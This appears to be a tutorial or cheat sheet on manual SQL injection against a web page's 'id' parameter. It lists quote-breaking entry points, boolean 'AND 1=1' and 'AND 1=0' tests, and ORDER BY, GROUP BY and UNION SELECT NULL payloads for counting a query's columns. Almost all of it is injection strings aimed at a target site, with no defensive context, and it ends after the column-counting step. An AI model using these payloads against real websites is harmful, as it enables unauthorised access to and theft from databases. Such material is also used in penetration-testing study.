In the process of finding SQL on the desired website, we must look for pages and forums that we must enter, 

or for example, by clicking on an icon or item, a new section will open for us.

For example, by clicking on an item, a GET request is sent to the origin of the website, but the id parameter is added to the URL and the value 13 is requested.

    http://target.tld/product.php?id=13

In order to make sure that this id parameter is related to the DBMS, we test different values ​​in the id input value.

For example, we have already tested and we know that we have a value for id=18.

so => id=13'+'5  and URL endoce it: id = 13'%2b'5

Entry Point:

     [Nothing]
    '
    "
    `
    ')
    ")
    `)
    '))
    "))
    `))

If it works and the output of parameter id=18 is displayed, you can test other inputs as well


another query: 

    ?id=13'AND 1=1 %23
    ?id=13'AND 1=0 %23
    ?id=13' order by 1 %23    => always true query


You can find the number of columns with order by:

    ?id=13'order by 10 %23

We will send this request if we don't get a response, that means the number of columns is less than 10 Now we decrease one by one until we get the response on page 13 and find the number of columns.

    1' ORDER BY 1--+    #True
    1' ORDER BY 2--+    #True
    1' ORDER BY 3--+    #True
    1' ORDER BY 4--+    #False - Query is only using 3 columns
                            #-1' UNION SELECT 1,2,3--+    True

and GROUP BY:

    1' GROUP BY 1--+    #True
    1' GROUP BY 2--+    #True
    1' GROUP BY 3--+    #True
    1' GROUP BY 4--+    #False - Query is only using 3 columns
                            #-1' UNION SELECT 1,2,3--+    True

                            



UNION is used to agree two queries. You can find the number of columns using UNION

    ?id=13'UNION SELECT NULL-- -            => ERROR!
    ?id=13'UNION SELECT NULL,NULL-- -       => ERROR!
    ?id=13'UNION SELECT NULL,NULL,NULL-- -  => No Error, so the number of columns is 3


    


    
    
    
